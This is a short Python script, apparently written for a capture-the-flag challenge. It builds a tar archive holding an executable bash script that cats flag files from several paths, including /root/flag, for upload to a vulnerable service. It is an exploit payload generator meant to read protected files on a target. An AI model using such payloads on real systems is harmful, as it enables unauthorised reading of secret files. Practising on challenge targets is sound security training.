#!/usr/bin/env python3
"""Create a tar with a bash script that outputs the flag."""
import tarfile
import io
import os

def create_script_tar():
    """Create tar with a .sh script that cats the flag."""
    script_content = b"""#!/bin/bash
cat /flag
cat /flag.txt
cat /root/flag
cat /home/ctf/flag
"""
    
    with tarfile.open("script_payload.tar", "w") as tar:
        ti = tarfile.TarInfo("getflag.sh")
        ti.size = len(script_content)
        ti.mode = 0o755  # executable
        tar.addfile(ti, io.BytesIO(script_content))
    
    print("Created script_payload.tar")

if __name__ == "__main__":
    os.chdir(r"C:\Users\Alexandru Moga\Documents\first-gooogot-game\explo")
    create_script_tar()
